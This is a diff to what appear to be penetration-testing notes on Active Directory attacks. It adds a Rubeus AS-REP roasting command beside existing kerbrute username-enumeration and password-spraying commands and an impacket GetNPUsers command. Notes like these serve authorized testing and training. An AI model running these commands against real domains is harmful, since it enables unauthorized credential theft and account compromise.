@@ -13,7 +13,18 @@ kerbrute userenum -d domain.local --dc $IP /usr/share/wordlists/seclists/Usernam
 kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
 ```
 
+## Rubeus (Kali Source)
+```
+/usr/share/windows-resources/rubeus/Rubeus.exe
+```
 # AS-REP Roasting
+
+## Rubeus AS-REPRoast
+```
+.\Rubeus.exe asreproast
+```
+
+
 ## Check for ASREPRoastable users with impacket
 ```bash
 impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
